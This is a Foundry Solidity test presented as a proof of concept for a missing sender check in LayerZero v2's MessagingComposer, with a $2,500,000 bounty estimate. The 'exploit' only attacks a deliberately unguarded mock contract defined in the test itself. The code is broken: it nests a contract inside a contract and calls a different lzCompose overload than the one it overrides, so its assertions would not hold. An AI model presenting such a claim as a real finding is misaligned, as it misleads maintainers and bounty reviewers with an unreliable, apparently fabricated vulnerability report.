// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MessagingComposer} from "packages/layerzero-v2/evm/protocol/contracts/MessagingComposer.sol";
import {ILayerZeroComposer} from "packages/layerzero-v2/evm/protocol/contracts/interfaces/ILayerZeroComposer.sol";

/// @title Exploit test for Missing Sender Assertion
/// @invariant File:packages/layerzero-v2/evm/protocol/contracts/MessagingComposer.sol:17 - "Composer must assert the sender for compose messages"
/// @bounty_estimate $2500000
/// @attacker Anyone can send compose messages without authorization
/// @impact Arbitrary callers execute lzCompose leading to spoofed messages
contract Exploit_ComposerAssertSender is Test {
    address attacker = address(0xBEEF);

    // simple composer that fails to assert msg.sender
    contract BadComposer is MessagingComposer, ILayerZeroComposer {
        address public lastFrom;
        address public lastCaller;
        bytes public lastMessage;

        function lzCompose(
            address _from,
            bytes32 /*_guid*/,
            bytes calldata _message,
            address /*_executor*/,
            bytes calldata /*_extra*/
        ) external payable override {
            lastFrom = _from;
            lastCaller = msg.sender;
            lastMessage = _message;
        }
    }

    function testExploit_composer_assert_sender_Idea1() public {
        BadComposer comp = new BadComposer();
        bytes32 guid = keccak256("guid");
        bytes memory msgData = "hello";

        // attacker queues compose message pretending to be a trusted OApp
        vm.prank(attacker);
        comp.sendCompose(address(comp), guid, 0, msgData);

        // attacker executes lzCompose directly
        vm.prank(attacker);
        comp.lzCompose(attacker, address(comp), guid, 0, msgData, "");

        // verify attacker was recorded as the caller
        assertEq(comp.lastCaller(), attacker, "Unauthorized caller executed");
        assertEq(comp.lastFrom(), attacker, "Spoofed sender recorded");
    }
}
